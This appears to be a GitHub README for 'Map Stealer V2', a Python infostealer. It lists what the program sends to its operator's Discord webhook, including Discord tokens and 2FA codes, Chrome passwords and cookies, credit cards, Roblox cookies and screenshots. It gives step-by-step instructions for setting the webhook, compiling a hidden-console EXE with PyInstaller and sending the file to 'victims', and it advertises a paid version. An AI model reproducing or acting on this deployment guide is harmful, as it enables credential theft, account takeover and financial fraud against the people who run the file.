## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy Map Stealer V2!

**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [Discord](https://discord.gg/vfJknm825G) and purchase one.

---

#### When someone executes the file, the following info will be sent to you:

- User Name
- Computer Name
- Windows Product Key & Build Info
- Pretty Fast Even if it Was Made With Python
- IP & Geolocation. (Country, City, Google Maps Location)
- A screenshot of all their monitors
- Roblox Cookies
- All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
- Discord 2FA Codes for accounts with 2FA enabled
- Their Passwords & Credit Cards for Discord (updates when they change it)
- All Passwords and Cookies from the Chrome Browser
  > The webhook notification looks like this:
 ![image (2)](https://user-images.githubusercontent.com/105587187/168469930-c05c7dd2-ba32-4b1c-a393-d35ada24ae0a.png)
![image (3)](https://user-images.githubusercontent.com/105587187/168470110-f93e16bd-81c7-402e-ac44-f8322f618629.png)



### 📁・Setting up Map Token Grabber.V2

1. Install python if you have not already. [(Link Here)](https://www.python.org/)
2. Open up main.py with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

### ⚙・Manually Compiling Source Code

If you do not want to use the batch file, you can follow this guide:

1. Open command prompt in the same directory as the .py file.
2. Type `pip install -r requirements.txt` (To install the modules)
3. Type: `pyinstaller --clean --onefile --noconsole -i NONE main.py`, you will see a lot of text popping up. Ignore it and wait.
4. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!

### 💾・ More options

Add these into the command when creating the exe if you want
| PyInstaller Options |
| ------------------------------------ |
| `-n name` The name of the compiled EXE (Defaults to the name of the original .py file) |
| `-i icon.ico` The icon. You can specify a directory to an icon file, or do NONE for a default EXE icon. |
| `--clean` Removes all temporary files so you only have what you need. |
| `--uac-admin` Modified the MANIFEST so that it will request UAC permissions upon running. |
| `--hidden-import MODULENAME` Adds a module without it being present in the script. |
